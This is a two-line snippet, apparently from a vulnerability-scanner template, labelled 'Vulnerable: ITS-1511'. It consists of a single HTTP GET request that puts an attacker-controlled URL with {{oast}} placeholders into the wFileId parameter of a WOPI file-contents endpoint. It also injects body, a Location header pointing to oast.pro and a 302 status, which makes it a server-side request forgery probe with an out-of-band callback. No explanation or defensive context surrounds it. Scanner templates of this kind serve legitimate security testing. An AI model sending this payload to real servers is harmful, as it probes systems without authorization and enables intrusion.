# Vulnerable: ITS-1511
GET /oh/wopi/files/@/wFileId/contents?wFileId=http://{{oast}}/{{string}}.xlsx%3fbody={{string}}%26header=Location:http://oast.pro%26status=302&access_token_ttl=0
